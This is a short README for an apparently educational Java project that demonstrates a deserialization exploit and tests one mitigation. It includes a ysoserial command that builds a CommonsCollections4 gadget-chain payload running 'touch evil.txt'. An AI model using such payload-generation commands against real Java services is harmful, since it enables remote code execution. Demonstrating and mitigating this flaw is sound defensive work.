In [BookTest](src/test/java/com/github/masooh/security/deserialization/BookTest.java) deserialization exploit is shown and one mitigation strategy tested.

The exploit payload `CommonsCollections4.ser` was created with [ysoserial](https://github.com/frohoff/ysoserial): 
```bash
java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections4 "touch evil.txt" > CommonsCollections4.ser
```

Resources

- https://github.com/frohoff/ysoserial
- https://www.christian-schneider.net/JavaDeserializationSecurityFAQ.html
